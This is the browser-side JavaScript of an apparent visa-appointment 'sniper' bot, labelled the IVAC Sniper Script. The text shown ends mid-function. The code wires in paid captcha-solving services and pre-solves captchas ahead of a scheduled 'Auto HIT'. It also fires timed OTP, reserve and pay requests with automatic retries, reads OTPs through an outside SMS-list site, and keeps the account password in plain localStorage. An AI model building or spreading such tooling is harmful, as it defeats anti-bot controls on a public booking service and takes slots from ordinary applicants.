const socket = io();

const $ = (id) => document.getElementById(id);
const showStatus = (msg, type = "info") => {
    const s = $("status");
    s.textContent = msg;
    s.className = type;
    s.style.display = 'block';
};

function logSolver(msg, color = "#10b981", json = null) {
    const c = $("solver-console");
    const container = $("solver-container");
    const now = new Date();
    const bdTime = new Date(now.getTime() + 6 * 60 * 60 * 1000);
    const timeStr = `${String(bdTime.getUTCHours()).padStart(2, "0")}:${String(bdTime.getUTCMinutes()).padStart(2, "0")}:${String(bdTime.getUTCSeconds()).padStart(2, "0")}`;
    
    const div = document.createElement("div");
    div.style.color = color;
    div.style.margin = "0";
    div.style.padding = "0";
    div.style.lineHeight = "1.15";
    div.style.display = "flex";
    div.style.alignItems = "center";
    div.style.gap = "6px";
    
    const txt = document.createElement("span");
    txt.textContent = `[${timeStr}] ${msg}`;
    div.appendChild(txt);
    
    if (json !== undefined && json !== null) {
        const icon = document.createElement("span");
        icon.innerHTML = "📄";
        icon.title = "View JSON Response";
        Object.assign(icon.style, { cursor: "pointer", fontSize: "12px", background: "rgba(255,255,255,0.1)", padding: "2px 5px", borderRadius: "4px", border: "1px solid rgba(255,255,255,0.15)", display: "flex", alignItems: "center", transition: "0.2s" });
        icon.onmouseover = () => icon.style.background = "rgba(255,255,255,0.25)";
        icon.onmouseout = () => icon.style.background = "rgba(255,255,255,0.1)";
        icon.onclick = () => showJsonPopup(json, `Log Data - ${timeStr}`);
        div.appendChild(icon);
    }
    
    c.appendChild(div);
    container.scrollTop = container.scrollHeight;
}

function showJsonPopup(data, title) {
    let m = document.getElementById("json-modal");
    if (m) m.remove();
    m = document.createElement("div");
    m.id = "json-modal";
    Object.assign(m.style, { position: "fixed", top: 0, left: 0, width: "100%", height: "100%", background: "rgba(0,0,0,0.85)", display: "flex", justifyContent: "center", alignItems: "center", zIndex: 3000000, backdropFilter: "blur(6px)" });
    
    const c = document.createElement("div");
    Object.assign(c.style, { background: "#0f172a", border: "1px solid #1e293b", padding: "18px", borderRadius: "12px", width: "550px", maxWidth: "90%", color: "#e5e7eb", display: "flex", flexDirection: "column", maxHeight: "85vh", boxShadow: "0 20px 40px rgba(0,0,0,0.8)" });
    
    const h = document.createElement("div");
    Object.assign(h.style, { display: "flex", justifyContent: "space-between", marginBottom: "12px", borderBottom: "1px solid #334155", paddingBottom: "10px", fontWeight: "bold", fontSize: "14px" });
    h.innerHTML = `<span><span style="color:#3b82f6;">{ }</span> ${title}</span><span style="cursor:pointer; color:#ef4444; background:rgba(239, 68, 68, 0.1); padding:2px 8px; border-radius:4px;" onclick="document.getElementById('json-modal').remove()">Close ✖</span>`;
    
    const pre = document.createElement("pre");
    Object.assign(pre.style, { overflow: "auto", background: "#020617", padding: "12px", borderRadius: "8px", border: "1px solid #0f172a", fontSize: "12px", margin: "0", flex: 1, whiteSpace: "pre-wrap", wordWrap: "break-word", color: "#34d399", fontFamily: "monospace" });

    let content = data;
    if (typeof data === "object") {
        content = Object.keys(data).length === 0 ? "// No valid response payload found from server" : JSON.stringify(data, null, 2);
    } else if (!data || data.toString().trim() === "") {
        content = "// No valid response payload found from server";
    }
    pre.textContent = content;
    
    c.appendChild(h);
    c.appendChild(pre);
    m.appendChild(c);
    document.body.appendChild(m);
}

// CAPTCHA CONFIGURATION
let CapInfo = JSON.parse(localStorage.getItem('cap-settings') || '{"type":"","key":""}');
socket.emit("cap-settings", CapInfo);

const capSetting = $("CapSetting");
if (capSetting) {
    capSetting.onclick = () => {
        $("captchaModal").classList.remove("hidden");
        $("capProvider").value = CapInfo.type || "capSolver";
        $("capKey").value = CapInfo.key || "";
    };
}

const capCancel = $("capCancel");
if (capCancel) {
    capCancel.onclick = () => {
        $("captchaModal").classList.add("hidden");
    };
}

const capSave = $("capSave");
if (capSave) {
    capSave.onclick = () => {
        const key = $("capKey").value.trim();
        if(key !== "") {
            const type = $("capProvider").value;
            CapInfo = { type, key };
            localStorage.setItem('cap-settings', JSON.stringify(CapInfo));
            socket.emit("cap-settings", CapInfo);
            updateCaptchaTitle();
            $("captchaModal").classList.add("hidden");
            showStatus("Captcha Key Saved Globally", "success");
        } else {
            showStatus("API Key cannot be empty", "error");
        }
    };
}

function updateCaptchaTitle() {
    if (CapInfo?.key) {
        $("CapSetting").textContent = "🔑";
        $("CapSetting").title = "Captcha API Configured";
    } else {
        $("CapSetting").textContent = "🛠️";
        $("CapSetting").title = "Captcha API NOT Configured";
    }
}
updateCaptchaTitle();

// REAL TIME CLOCK
setInterval(() => {
    $("bd-clock").innerText = new Date().toLocaleTimeString("en-US", { timeZone: "Asia/Dhaka", hour12: true });
}, 1000);

// AUTO SCHEDULER
const autoSchedulerRow = $("autoSchedulerRow");
if (autoSchedulerRow) {
    const wrapper = document.createElement("div");
    wrapper.style.display = "flex"; wrapper.style.alignItems = "center"; wrapper.style.gap = "10px"; wrapper.style.width = "100%"; wrapper.style.justifyContent = "space-around";
    
    const timeSection = document.createElement("div");
    timeSection.style.display = "flex"; timeSection.style.alignItems = "center"; timeSection.style.gap = "5px";

    const timeLabel = document.createElement("span"); 
    timeLabel.textContent = "Hit Time :"; 
    Object.assign(timeLabel.style, { fontSize: "12px", color: "#94a3b8", fontWeight: "600" });

    const timeInput = document.createElement("input");
    timeInput.type = "text";
    Object.assign(timeInput.style, { borderRadius: "4px", padding: "4px", fontSize: "14px", height: "auto", width: "80px", textAlign: "center", color: "#d2d2d2", border: "1px solid #727272", backgroundColor: "#000", margin: "0" });
    const savedTime = JSON.parse(localStorage.getItem("autoClickTimeMs") || "{}");
    timeInput.value = savedTime.time || "17:00:00";
    timeInput.onchange = () => localStorage.setItem("autoClickTimeMs", JSON.stringify({ time: timeInput.value }));
    
    timeSection.append(timeLabel, timeInput);
    
    const toggleWrapper = document.createElement("label");
    Object.assign(toggleWrapper.style, { display: "flex", alignItems: "center", cursor: "pointer", gap: "6px" });
    const toggleLabel = document.createElement("span"); toggleLabel.textContent = "Auto HIT :"; Object.assign(toggleLabel.style, { fontSize: "12px", color: "#94a3b8", fontWeight: "600" });
    
    const toggleInput = document.createElement("input"); toggleInput.type = "checkbox"; toggleInput.checked = localStorage.getItem("autoTimeEnabled") === "true"; toggleInput.style.display = "none";
    const slider = document.createElement("span"); const SLIDER_WIDTH = 34, SLIDER_HEIGHT = 18, CIRCLE_SIZE = 14;
    Object.assign(slider.style, { position: "relative", display: "inline-block", width: SLIDER_WIDTH + "px", height: SLIDER_HEIGHT + "px", backgroundColor: toggleInput.checked ? "#28a745" : "#475569", borderRadius: SLIDER_HEIGHT + "px", transition: "0.3s" });
    const circle = document.createElement("span");
    Object.assign(circle.style, { position: "absolute", height: CIRCLE_SIZE + "px", width: CIRCLE_SIZE + "px", left: toggleInput.checked ? (SLIDER_WIDTH - CIRCLE_SIZE - 2) + "px" : "2px", bottom: "2px", backgroundColor: "#fff", borderRadius: "50%", transition: "0.3s" });
    
    slider.appendChild(circle); toggleWrapper.append(toggleLabel, toggleInput, slider);
    toggleWrapper.onclick = () => {
        toggleInput.checked = !toggleInput.checked;
        localStorage.setItem("autoTimeEnabled", toggleInput.checked ? "true" : "false");
        slider.style.backgroundColor = toggleInput.checked ? "#28a745" : "#475569";
        circle.style.left = toggleInput.checked ? (SLIDER_WIDTH - CIRCLE_SIZE - 2) + "px" : "2px";
        localStorage.setItem("autoClickTimeMs", JSON.stringify({ time: timeInput.value }));
        if (window.autoClickTimeout) clearTimeout(window.autoClickTimeout);
        if (window.reserveTimeout) clearTimeout(window.reserveTimeout);
        if (toggleInput.checked) scheduleAutoClick();
    };
    wrapper.append(timeSection, toggleWrapper); autoSchedulerRow.appendChild(wrapper);
    if (toggleInput.checked) scheduleAutoClick();
}

function scheduleAutoClick() {
    const toggleInput = document.querySelector('label input[type="checkbox"]');
    if (!toggleInput?.checked) return;
    
    let timeValues = { time: "17:00:00" };
    try {
        const stored = localStorage.getItem("autoClickTimeMs");
        if (stored && stored !== 'undefined') timeValues = JSON.parse(stored);
    } catch(e) {}
    const timeStr = timeValues.time || "17:00:00";
    let [hour, minute, second] = timeStr.split(":").map(Number);
    const bdNow = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Dhaka" }));
    const target = new Date(bdNow); target.setHours(hour, minute, second);
    if (target <= bdNow) target.setDate(target.getDate() + 1);
    
    const targetMs = target.getTime();
    window.reserveOtpSent = false;
    
    if (window.autoTimer) clearInterval(window.autoTimer);
    if (window.reserveTimeout) clearTimeout(window.reserveTimeout);
    if (window.autoClickTimeout) clearTimeout(window.autoClickTimeout);
    
    // High-frequency active polling loop to bypass browser sleep-throttling
    window.autoTimer = setInterval(() => {
        if (!toggleInput.checked) {
            clearInterval(window.autoTimer);
            return;
        }

        const now = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Dhaka" })).getTime();
        const diff = targetMs - now;

        // Precision Timing Checkpoints
        if (diff <= 50000 && diff > 0) {
            const checkpoints = [
                { time: 50000, label: "ReserveOTP", action: () => {
                    socket.emit("reserve-otp", { email: $("email").value.trim(), mobile: $("mb").value.trim(), retrySettings: getRetrySettings() });
                }},
                { time: 20000, label: "Captcha Solves (2x)", action: () => {
                    socket.emit("pre-solve-batch", 2);
                }},
            ];

            for (const cp of checkpoints) {
                if (diff <= cp.time && diff > (cp.time - 1000) && !window[`fired_${cp.time}`]) {
                    window[`fired_${cp.time}`] = true;
                    cp.action();
                    logSolver(`[Auto] Firing Checkpoint: ${cp.label} (${cp.time/1000}s)`, "#3b82f6");
                    break; 
                }
            }
        }
        
        // Exact main hit
        if (diff <= 300 && diff > -60000) {
            clearInterval(window.autoTimer);
            $("sendOtp").click();
            
            // Auto-disable trigger logic
            toggleInput.checked = false; 
            localStorage.setItem("autoTimeEnabled", "false");
            
            const uiToggle = toggleInput.nextElementSibling;
            if (uiToggle) {
                uiToggle.style.backgroundColor = "#ccc";
                const uiCircle = uiToggle.querySelector("span");
                if (uiCircle) uiCircle.style.left = "2px";
            }
        }
    }, 100);
}

// SOCKET EVENTS
socket.on("status", ({ msg, type }) => {
    showStatus(msg, type);
    if (msg === "Unauthorized!") {
        // HARD RELOCK: Hide the panel from the DOM
        const app = $("app-container");
        if (app) app.style.setProperty("display", "none", "important");

        // Show login overlay
        const overlay = $("login-overlay");
        if (overlay) {
            overlay.style.display = 'flex';
            overlay.style.opacity = '1';
            overlay.style.backdropFilter = 'blur(10px)';
        }
        
        const loginBtn = $("login-btn");
        if (loginBtn) {
            loginBtn.textContent = "Sign In";
            loginBtn.style.background = "";
        }
    }
});

socket.on("disconnect", () => {
    // HARD RELOCK on connection loss
    const app = $("app-container");
    if (app) app.style.setProperty("display", "none", "important");
    
    const overlay = $("login-overlay");
    if (overlay) {
        overlay.style.display = 'flex';
        overlay.style.opacity = '1';
        overlay.style.backdropFilter = 'blur(10px)';
    }
});
socket.on("solver-log", ({ msg, color, json }) => logSolver(msg, color, json));
socket.on("state-sync", (state) => {});

socket.on("initial-config", (config) => {
    if (config.mobile) $("mb").value = config.mobile;
    if (config.email) $("email").value = config.email;
    if (config.password) $("mbpass").value = config.password;
    if (config.capInfo && config.capInfo.key) {
        CapInfo = config.capInfo;
        updateCaptchaTitle();
    }
});

socket.on("show-reservation-success-popup", (data) => {
    savePaymentInfo(null, data?.userId);
    let m = document.getElementById("success-popup-modal");
    if (m) m.remove();
    
    m = document.createElement("div");
    m.id = "success-popup-modal";
    Object.assign(m.style, {
        position: "fixed", top: "0", left: "0", width: "100%", height: "100%",
        display: "flex", justifyContent: "center", alignItems: "center",
        zIndex: "3000000", background: "rgba(0,0,0,0.85)", backdropFilter: "blur(10px)",
        animation: "fadeIn 0.3s ease-out"
    });
    
    // Keyframes for animations
    const style = document.createElement('style');
    style.innerHTML = `
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes scaleUp { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
        @keyframes pulseGlow { 0% { box-shadow: 0 0 10px rgba(16, 185, 129, 0.4); } 50% { box-shadow: 0 0 25px rgba(16, 185, 129, 0.8); } 100% { box-shadow: 0 0 10px rgba(16, 185, 129, 0.4); } }
    `;
    document.head.appendChild(style);

    const c = document.createElement("div");
    Object.assign(c.style, {
        background: "linear-gradient(145deg, #0f172a, #020617)",
        border: "1px solid #10b981",
        borderRadius: "16px", padding: "30px", width: "400px", maxWidth: "90%",
        color: "#f8fafc", textAlign: "center",
        boxShadow: "0 20px 50px rgba(0,0,0,0.8), inset 0 1px 0 rgba(255,255,255,0.05)",
        animation: "scaleUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards"
    });

    const icon = document.createElement("div");
    icon.innerHTML = "✓";
    Object.assign(icon.style, {
        width: "60px", height: "60px", background: "linear-gradient(135deg, #10b981, #059669)",
        borderRadius: "50%", display: "flex", justifyContent: "center", alignItems: "center",
        fontSize: "36px", fontWeight: "bold", color: "#fff", margin: "0 auto 15px auto",
        animation: "pulseGlow 2s infinite"
    });

    const title = document.createElement("h2");
    title.innerText = "Reservation Successful!";
    Object.assign(title.style, {
        margin: "0 0 10px 0", fontSize: "22px", fontWeight: "700", color: "#34d399", letterSpacing: "0.5px"
    });

    const subtitle = document.createElement("p");
    subtitle.innerText = "Slot is reserved. Returning to Pay Now queue in:";
    Object.assign(subtitle.style, { margin: "0 0 20px 0", fontSize: "12px", color: "#94a3b8" });

    const timer = document.createElement("div");
    Object.assign(timer.style, {
        fontSize: "42px", fontWeight: "bold", color: "#fff", fontFamily: "monospace",
        letterSpacing: "2px", margin: "0 0 25px 0", background: "rgba(0,0,0,0.5)",
        padding: "10px", borderRadius: "12px", border: "1px solid #334155"
    });

    const btnRow = document.createElement("div");
    Object.assign(btnRow.style, { display: "flex", gap: "10px" });

    const closeBtn = document.createElement("button");
    closeBtn.innerText = "Close";
    Object.assign(closeBtn.style, {
        flex: "1", padding: "12px", borderRadius: "8px", border: "1px solid #475569",
        background: "transparent", color: "#cbd5e1", fontWeight: "bold", cursor: "pointer", transition: "0.2s"
    });
    closeBtn.onmouseover = () => closeBtn.style.background = "rgba(255,255,255,0.05)";
    closeBtn.onmouseout = () => closeBtn.style.background = "transparent";

    const payBtn = document.createElement("button");
    payBtn.innerText = "Pay Now";
    Object.assign(payBtn.style, {
        flex: "1", padding: "12px", borderRadius: "8px", border: "none",
        background: "linear-gradient(135deg, #10b981, #059669)", color: "#fff",
        fontWeight: "bold", cursor: "pointer", transition: "0.2s",
        boxShadow: "0 4px 12px rgba(16, 185, 129, 0.3)"
    });
    payBtn.onmouseover = () => { payBtn.style.transform = "translateY(-2px)"; payBtn.style.boxShadow = "0 6px 16px rgba(16, 185, 129, 0.4)"; };
    payBtn.onmouseout = () => { payBtn.style.transform = "translateY(0)"; payBtn.style.boxShadow = "0 4px 12px rgba(16, 185, 129, 0.3)"; };

    btnRow.appendChild(closeBtn);
    btnRow.appendChild(payBtn);

    c.appendChild(icon);
    c.appendChild(title);
    c.appendChild(subtitle);
    c.appendChild(timer);
    c.appendChild(btnRow);
    m.appendChild(c);
    document.body.appendChild(m);

    let timeLeft = 20; // 20 seconds
    let countdownInterval;

    const renderTime = () => {
        const min = Math.floor(timeLeft / 60).toString().padStart(2, '0');
        const sec = (timeLeft % 60).toString().padStart(2, '0');
        timer.innerText = `${min}:${sec}`;
    };
    renderTime();

    countdownInterval = setInterval(() => {
        timeLeft--;
        if (timeLeft <= 0) {
            clearInterval(countdownInterval);
            const payObj = $("payNow");
            if (payObj) payObj.click();
            m.remove();
        } else {
            renderTime();
        }
    }, 1000);

    closeBtn.onclick = () => {
        clearInterval(countdownInterval);
        m.remove();
    };

    payBtn.onclick = () => {
        clearInterval(countdownInterval);
        const payObj = $("payNow");
        if (payObj) payObj.click();
        m.remove();
    };
});

// STOP ALL
const btnStop = $("stopAll");
if (btnStop) {
    btnStop.onclick = () => {
        socket.emit("stop-all");
        $("sendOtp").innerHTML = "Send OTP";
        $("verifyOtp").innerHTML = "Verify OTP";
        $("reserveSlot").innerHTML = "Reserve Slot";
        $("payNow").innerHTML = "Pay Now";
        updateStep("none");
    };
}

const loadInfo = () => {
    let d = {};
    try {
        const stored = localStorage.getItem("file_info");
        if (stored && stored !== 'undefined') d = JSON.parse(stored);
    } catch(e) {}
    $("mb").value = d.mobile || "";
    $("mbpass").value = d.password || "";
    $("email").value = d.email || "";
};
loadInfo();
console.log("🎯 IVAC Sniper Script Initialized Successfully");

$("saveInfo").onclick = () => {
    const mobile = $("mb").value.trim();
    const email = $("email").value.trim();
    const password = $("mbpass").value.trim();
    
    localStorage.setItem("file_info", JSON.stringify({ mobile, email, password }));
    
    socket.emit("save-file-info", { mobile, email, password });
    
    showStatus("Saved Globally!", "success");
};

socket.on("btn-reset", ({ id, text, stepStatus, activeStep }) => {
    const btn = $(id);
    if(btn) btn.innerHTML = text;
    if (activeStep) {
        updateStep(activeStep, stepStatus);
    }
});

function updateStep(stepId, status = "active") {
    const allSteps = ["sendOtp", "verifyOtp", "reserveSlot", "payNow"];
    const labels = { "sendOtp": "SendOTP", "verifyOtp": "Verify", "reserveSlot": "Reserve", "payNow": "PayNow" };
    
    if (stepId === "none") {
        allSteps.forEach(s => {
            const el = $(`step-${s}`);
            if (el) {
                el.className = "step";
                el.innerHTML = labels[s];
            }
        });
        return;
    }
    
    const stepEl = $(`step-${stepId}`);
    if (stepEl) {
        if (status === "active") {
            stepEl.className = "step active";
            stepEl.innerHTML = labels[stepId] + " <svg class='spinner-svg' viewBox='0 0 50 50'><circle cx='25' cy='25' r='20'></circle></svg>";
            const index = allSteps.indexOf(stepId);
            
            // Only reset subsequent steps, preserving the state of previous ones
            for(let i=index+1; i<allSteps.length; i++) {
                const next = $(`step-${allSteps[i]}`);
                if(next) {
                    next.className = "step";
                    next.innerHTML = labels[allSteps[i]];
                }
            }
        } else if (status === "done") {
            stepEl.className = "step done";
            stepEl.innerHTML = labels[stepId] + " ✔";
        }
    }
}

socket.on("set-otp-value", (otp) => {
    $("otp").value = otp;
});

// ACTIONS
function getRetrySettings() {
    let modeVal = $("retry-mode").value;
    return {
        seconds: parseInt($("retry-select").value, 10),
        enabled: $("retry-toggle").classList.contains("on"),
        mode: parseInt(modeVal, 10) || 3,
        logic: $("retry-logic").value || "onFail"
    };
}

const btnGet = $("getOtp");
if (btnGet) {
    btnGet.onclick = () => {
        btnGet.textContent = "Searching...";
        socket.emit("get-otp", {
            mobile: $("mb").value.trim(),
            retrySettings: getRetrySettings()
        });
    };
}

// Retry UI Buttons
const retryToggle = $("retry-toggle");
if (retryToggle) {
    retryToggle.onclick = function () {
        if (this.classList.contains("on")) {
            this.classList.replace("on", "off");
            this.textContent = "AUTO OFF";
        } else {
            this.classList.replace("off", "on");
            this.textContent = "AUTO ON";
        }
    };
}

const retryMode = $("retry-mode");
if (retryMode) {
    retryMode.onchange = function () {
        localStorage.setItem("ivac_retry_mode", this.value);
    };
    const savedMode = localStorage.getItem("ivac_retry_mode");
    if (savedMode) retryMode.value = savedMode;
}

const retryLogic = $("retry-logic");
if (retryLogic) {
    retryLogic.onchange = function () {
        localStorage.setItem("ivac_retry_logic", this.value);
    };
    const savedLogic = localStorage.getItem("ivac_retry_logic");
    if (savedLogic) retryLogic.value = savedLogic;
    else retryLogic.value = "onFail";
}

const togglePass = $("togglePassword");
if (togglePass) {
    togglePass.onclick = function () {
        const input = $("mbpass");
        if (input.type === "password") {
            input.type = "text";
            this.textContent = "🙈";
        } else {
            input.type = "password";
            this.textContent = "👁";
        }
    };
}

const tabSignIn = $("tabSignIn");
if (tabSignIn) {
    tabSignIn.onclick = () => {
        tabSignIn.classList.add("active");
    };
}

const btnSms = $("smsList");
if (btnSms) {
    btnSms.onclick = () => {
        const phone = $("mb").value.trim();
        if (!phone) return showStatus("Enter Mobile Number", "error");
        window.open(`https://sms.mrshuvo.xyz/sms-list/${phone}`, '_blank');
    };
}

const btnReserveOtpBtn = $("reserveOtpBtn");
if (btnReserveOtpBtn) {
    btnReserveOtpBtn.onclick = () => {
        btnReserveOtpBtn.innerHTML = "<span class='spin'>⏳</span>...";
        
        let isPreWarmupStr = false;
        try {
            const stored = localStorage.getItem("autoClickTimeMs");
            if (stored && stored !== 'undefined') {
                const timeStr = JSON.parse(stored).time || "17:00:00";
                let [hour, minute, second] = timeStr.split(":").map(Number);
                const bdNow = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Dhaka" }));
                const target = new Date(bdNow); target.setHours(hour, minute, second, 0);
                
                const diff = target.getTime() - bdNow.getTime();
                // If the hit time is in the future (within the next 12 hours), we are BEFORE the hit time.
                if (diff > 0 && diff < 12 * 60 * 60 * 1000) {
                    isPreWarmupStr = true;
                }
            }
        } catch(e) {}

        socket.emit("reserve-otp", {
            mobile: $("mb").value.trim(),
            email: $("email").value.trim(),
            retrySettings: getRetrySettings(),
            isPreWarmup: isPreWarmupStr
        });
    };
}

const btnSend = $("sendOtp");
if (btnSend) {
    btnSend.onclick = async () => {
        btnSend.innerHTML = "<span class='spin'>⏳</span> Sending...";
        updateStep("sendOtp", "active");
        socket.emit("send-otp", {
            mobile: $("mb").value.trim(),
            email: $("email").value.trim(),
            mbpassword: $("mbpass").value.trim(),
            oldOtp: $("otp").value.trim(),
            retrySettings: getRetrySettings()
        });
    };
}

const btnVerify = $("verifyOtp");
if (btnVerify) {
    btnVerify.onclick = () => {
        btnVerify.innerHTML = "<span class='spin'>⏳</span> Verifying...";
        updateStep("verifyOtp", "active");
        socket.emit("verify-otp", {
            mobile: $("mb").value.trim(),
            otp: $("otp").value.trim(),
            retrySettings: getRetrySettings()
        });
    };
}

const btnReserve = $("reserveSlot");
if (btnReserve) {
    btnReserve.onclick = async () => {
        btnReserve.innerHTML = "<span class='spin'>⏳</span> Reserving...";
        updateStep("reserveSlot", "active");
        socket.emit("reserve-slot", { 
            retrySettings: getRetrySettings()
        });
    };
}

const btnPay = $("payNow");
if (btnPay) {
    btnPay.onclick = () => {
        btnPay.innerHTML = "<span class='spin'>⏳</span> Loading...";
        updateStep("payNow", "active");
        let rSet = getRetrySettings();
        rSet.logic = "batch";
        socket.emit("pay-now", { retrySettings: rSet });
    };
}

const btnCheck = $("checkFile");
if (btnCheck) {
    btnCheck.onclick = () => {
        btnCheck.textContent = "Loading...";
        socket.emit("check-file", { retrySettings: getRetrySettings() });
    };
}

const btnClear = $("clearInfo");
if (btnClear) {
    btnClear.onclick = () => {
        $("mb").value = "";
        $("email").value = "";
        $("mbpass").value = "";
        localStorage.removeItem("file_info");
        socket.emit("save-file-info", { mobile: "", email: "", password: "" });
        showStatus("Info Cleared", "success");
    };
}

const SHOW_PDF_UPLOAD = true;

socket.on("check-file-response", (res) => {
    const btn = $("checkFile");
    if(btn) btn.textContent = "Check File";
    if (res.status === "success") {
        showStatus("File found", "success");
        showDetailsPopup(res.data);
    } else if (res.status === "no-data") {
        showStatus("No data found!", "error");
    } else if (res.status === "token-expired") {
        showStatus("Session Expired!", "error");
        logSolver("Session Expired!");
        showUploadPopup();
    } else if (res.status === "error") {
        showStatus("No file uploaded", "error");
        logSolver("No file uploaded!");
        showUploadPopup();
    }
});

function showUploadPopup() {
    let m = document.getElementById("upload-modal");
    if (m) m.remove();

    const panel = document.getElementById("ivac-panel");
    const rect = panel ? panel.getBoundingClientRect() : { top: 70, left: 60, width: 320, height: 400 };
    const panelMidY = rect.top + (rect.height || 400) / 2;

    m = document.createElement("div");
    m.id = "upload-modal";
    Object.assign(m.style, {
        position: "fixed", top: 0, left: 0, width: "100%", height: "100%",
        background: "rgba(0,0,0,0.35)",
        zIndex: 2147483647, fontFamily: "system-ui,-apple-system,Segoe UI"
    });

    const c = document.createElement("div");
    Object.assign(c.style, {
        position: "fixed",
        left: Math.max(0, rect.left) + "px",
        width: rect.width + "px",
        background: "linear-gradient(145deg, #fff, #f0f0f0)", color: "#1a1a1a",
        padding: "15px", borderRadius: "12px",
        boxShadow: "0 20px 50px rgba(0,0,0,.4)",
        fontSize: "13px",
        boxSizing: "border-box"
    });

    requestAnimationFrame(() => {
        const popH = c.getBoundingClientRect().height;
        let topPos = panelMidY - popH / 2;
        topPos = Math.max(10, Math.min(topPos, window.innerHeight - popH - 10));
        c.style.top = topPos + "px";
    });

    const closeBtn = document.createElement("div");
    closeBtn.innerHTML = "&times;";
    Object.assign(closeBtn.style, {
        position: "absolute", top: "8px", right: "12px", fontSize: "22px", fontWeight: "bold",
        cursor: "pointer", color: "#666", transition: "color 0.2s", lineHeight: "1"
    });
    closeBtn.onmouseenter = () => closeBtn.style.color = "#f44336";
    closeBtn.onmouseleave = () => closeBtn.style.color = "#666";
    closeBtn.onclick = () => m.remove();
    c.appendChild(closeBtn);

    const title = document.createElement("h3");
    title.textContent = "No File Uploaded";
    Object.assign(title.style, {
        margin: "5px 0 12px", fontSize: "15px", color: "#c00", textAlign: "center",
        borderBottom: "1px solid #ddd", paddingBottom: "10px"
    });
    c.appendChild(title);

    const fileInput = document.createElement("input");
    fileInput.type = "file";
    fileInput.accept = ".pdf";
    Object.assign(fileInput.style, {
        width: "100%", padding: "8px", border: "1px solid #d0d5dd",
        borderRadius: "6px", background: "#fff", fontSize: "12px",
        boxSizing: "border-box", cursor: "pointer"
    });
    c.appendChild(fileInput);

    const uploadBtn = document.createElement("button");
    uploadBtn.textContent = "Upload PDF";
    Object.assign(uploadBtn.style, {
        width: "100%", marginTop: "10px", padding: "9px",
        background: "linear-gradient(90deg, #16a34a, #15803d)", color: "#fff",
        border: "none", borderRadius: "6px", fontSize: "13px",
        fontWeight: "600", cursor: "pointer", transition: "opacity 0.2s"
    });
    uploadBtn.onmouseenter = () => uploadBtn.style.opacity = "0.9";
    uploadBtn.onmouseleave = () => uploadBtn.style.opacity = "1";
    c.appendChild(uploadBtn);

    const msgBox = document.createElement("div");
    Object.assign(msgBox.style, {
        marginTop: "10px", padding: "0", fontSize: "12px",
        textAlign: "center", borderRadius: "6px", display: "none"
    });
    c.appendChild(msgBox);

    const showMsg = (text, type) => {
        msgBox.textContent = text;
        msgBox.style.display = "block";
        msgBox.style.padding = "8px";
        if (type === "success") {
            msgBox.style.background = "#dcfce7";
            msgBox.style.color = "#166534";
            msgBox.style.border = "1px solid #86efac";
        } else {
            msgBox.style.background = "#fee2e2";
            msgBox.style.color = "#991b1b";
            msgBox.style.border = "1px solid #fca5a5";
        }
    };

    uploadBtn.onclick = async () => {
        const file = fileInput.files[0];
        if (!file) return showMsg("Please select a PDF file", "error");
        if (!file.name.toLowerCase().endsWith(".pdf")) return showMsg("Only PDF files are allowed", "error");

        uploadBtn.textContent = "Uploading...";
        uploadBtn.style.opacity = "0.6";
        uploadBtn.style.pointerEvents = "none";

        const reader = new FileReader();
        reader.onload = (e) => {
            const base64 = e.target.result.split(',')[1];
            socket.once("upload-file-result", (data) => {
                if (data.success) {
                    const valErrors = data?.data?.error;
                    if (Array.isArray(valErrors) && valErrors.length > 0) {
                        const errText = valErrors.map(err => '⚠ ' + err).join('\n');
                        showMsg(errText, "error");
                        msgBox.style.textAlign = "left";
                        msgBox.style.whiteSpace = "pre-wrap";
                        msgBox.style.fontSize = "11px";
                        showStatus("Upload validation failed!", "error");
                        logSolver(`Upload validation failed: ${valErrors.length} error(s)`, "#d97706");
                        valErrors.forEach(err => logSolver(err, "#dc2626"));
                        uploadBtn.textContent = "Upload PDF";
                    } else {
                        showMsg("File uploaded successfully! ✓", "success");
                        logSolver("File uploaded successfully!", "#16a34a");
                        showStatus("File uploaded!", "success");
                        uploadBtn.textContent = "✓ Uploaded";
                        uploadBtn.style.background = "#16a34a";
                        setTimeout(() => m.remove(), 2000);
                        return; // Keep pointer disabled
                    }
                } else {
                    const errMsg = data?.message || "Upload failed!";
                    showMsg(errMsg, "error");
                    logSolver(`Upload failed: ${errMsg}`, "#dc2626");
                    uploadBtn.textContent = "Upload PDF";
                }
                uploadBtn.style.opacity = "1";
                uploadBtn.style.pointerEvents = "auto";
            });
            socket.emit("upload-file", { base64, name: file.name, isPrimary: "true" });
        };
        reader.readAsDataURL(file);
    };

    m.appendChild(c);
    m.addEventListener("click", e => { if (e.target === m) m.remove(); });
    document.body.appendChild(m);
}

function showDetailsPopup(dataList) {
    let m = document.getElementById("details-modal");
    if (m) m.remove();
    
    const panel = document.getElementById("ivac-panel");
    const rect = panel ? panel.getBoundingClientRect() : { top: 70, left: 60, width: 320, height: 400 };
    const panelMidY = rect.top + (rect.height || 400) / 2;

    m = document.createElement("div");
    m.id = "details-modal";
    Object.assign(m.style, {
        position: "fixed", top: 0, left: 0, width: "100%", height: "100%",
        background: "rgba(0,0,0,0.35)",
        zIndex: 2147483647, fontFamily: "system-ui,-apple-system,Segoe UI"
    });

    const c = document.createElement("div");
    Object.assign(c.style, {
        position: "fixed",
        left: Math.max(0, rect.left) + "px",
        width: rect.width + "px",
        maxHeight: "80vh",
        overflowY: "auto",
        background: "linear-gradient(145deg, #fff, #f0f0f0)", color: "#1a1a1a",
        padding: "15px", borderRadius: "12px", 
        boxShadow: "0 20px 50px rgba(0,0,0,.4)",
        fontSize: "13px",
        boxSizing: "border-box"
    });

    requestAnimationFrame(() => {
        const popH = c.getBoundingClientRect().height;
        let topPos = panelMidY - popH / 2;
        topPos = Math.max(10, Math.min(topPos, window.innerHeight - popH - 10));
        c.style.top = topPos + "px";
    });

    const closeBtn = document.createElement("div");
    closeBtn.innerHTML = "&times;";
    Object.assign(closeBtn.style, {
        position: "absolute", top: "8px", right: "12px", fontSize: "22px", fontWeight: "bold",
        cursor: "pointer", color: "#666", transition: "color 0.2s", lineHeight: "1"
    });
    closeBtn.onmouseenter = () => closeBtn.style.color = "#f44336";
    closeBtn.onmouseleave = () => closeBtn.style.color = "#666";
    closeBtn.onclick = () => m.remove();
